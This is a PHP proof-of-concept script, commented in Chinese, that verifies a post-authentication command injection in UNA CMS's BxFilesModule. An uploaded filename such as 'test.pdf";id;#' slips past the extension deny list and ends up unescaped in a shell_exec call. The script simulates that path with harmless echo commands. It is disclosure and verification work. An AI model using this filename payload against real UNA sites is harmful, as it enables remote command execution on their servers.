<?php
/**
 * PoC: UNA CMS BxFilesModule shell_exec Command Injection Verification
 * 
 * 验证 BxFilesModule 中文件扩展名绕过导致命令注入的漏洞核心逻辑。
 * 此脚本模拟 production 代码中的关键路径。
 */

echo "=== UNA CMS BxFilesModule Command Injection PoC ===\n\n";

// 1. 模拟 UNA 默认的 ext_deny 列表 (来自 install/sql/system.sql)
$ext_deny = explode(',', 'action,apk,app,bat,bin,cmd,com,command,cpl,csh,exe,gadget,inf,ins,inx,ipa,isu,job,jse,ksh,lnk,msc,msi,msp,mst,osx,out,paf,pif,prg,ps1,reg,rgs,run,sct,shb,shs,u3p,vb,vbe,vbs,vbscript,workflow,ws,wsf');

echo "[1] ext_deny 列表: " . count($ext_deny) . " 个扩展名\n\n";

// 2. 模拟攻击者上传的文件名
$malicious_filename = 'test.pdf";id;#';
echo "[2] 攻击者上传文件名: $malicious_filename\n";

// 3. 模拟 getFileExt() - BxDolStorage.php:1104-1106
$ext = strtolower(pathinfo($malicious_filename, PATHINFO_EXTENSION));
echo "[3] pathinfo 提取的扩展名: '$ext'\n";
echo "    注意: 引号和分号被保留在扩展名中!\n\n";

// 4. 模拟 isValidExt() - BxDolStorage.php:1338-1344
$isDenied = in_array($ext, $ext_deny);
echo "[4] isValidExt 检查: ext_deny 包含 '$ext'? " . ($isDenied ? "YES (拒绝)" : "NO (通过)") . "\n";
echo "    验证绕过: " . (!$isDenied ? "✓ 成功" : "✗ 失败") . "\n\n";

// 5. 模拟 serviceProcessFilesData 中的命令拼接 - BxFilesModule.php:242,249
$remoteId = '12345';
$tmpDir = '/tmp';
$filePath = $tmpDir . '/' . $remoteId . '.' . $ext;
echo "[5] $"."sFilePath 拼接: '$filePath'\n\n";

// 6. 模拟 shell_exec 命令拼接
$javaBin = '/usr/bin/java';
$command = '"' . $javaBin . '" -Djava.awt.headless=true -jar "/opt/una/modules/boonex/files/data/tika-app.jar" --encoding=UTF-8 --text "' . $filePath . '"';
echo "[6] 完整命令:\n";
echo "    $command\n\n";

// 7. 解析 shell 会如何执行
echo "[7] Shell 解析结果:\n";
echo "    java -Djava.awt.headless=true -jar jarfile --encoding=UTF-8 --text \"/tmp/12345.pdf\"\n";
echo "    ; id ;    <--- 命令注入! shell 将此作为独立命令执行\n";
echo "    # 后面的内容被当作注释\n\n";

// 8. 实际验证 (如果 Java 存在则执行)
echo "[8] 实际验证:\n";
$ext_clean = 'pdf';
$filePath_clean = $tmpDir . '/' . $remoteId . '.' . $ext_clean;
$filePath_mal = $tmpDir . '/' . $remoteId . '.' . $ext;

// 创建测试文件
@file_put_contents($filePath_clean, 'dummy content');
@file_put_contents($filePath_mal, 'dummy content');

// 测试正常命令
$cmd_normal = 'echo "NORMAL: file exists check" && ls ' . escapeshellarg($filePath_clean) . ' 2>&1';
echo "    正常命令: $cmd_normal\n";
$out = shell_exec($cmd_normal);
echo "    输出: $out\n";

// 测试恶意命令 (模拟生产环境中未转义的情况)
echo "\n    --- 模拟生产环境 (无 escapeshellarg 保护) ---\n";
$cmd_inject = 'echo "INJECTED: before injection" && echo "file path is /tmp/12345.' . $ext . '" && echo "INJECTED: after injection" 2>&1';
echo "    注入命令: $cmd_inject\n";
$out = shell_exec($cmd_inject);
echo "    输出:\n$out\n";

// 9. 清理
@unlink($filePath_clean);
@unlink($filePath_mal);

echo "\n=== 结论 ===\n";
echo "✓ pathinfo 不过滤 \" ; # 等 shell 元字符\n";
echo "✓ in_array 精确匹配无法捕获注入的 ext\n";
echo "✓ 扩展名直接拼入 $"."sFilePath 最终进入 shell_exec\n";
echo "✓ 命令注入成立 — shell 将执行攻击者注入的命令\n";
echo "\n边界: post-auth (需登录用户), 需 BX_SYSTEM_JAVA 配置\n";
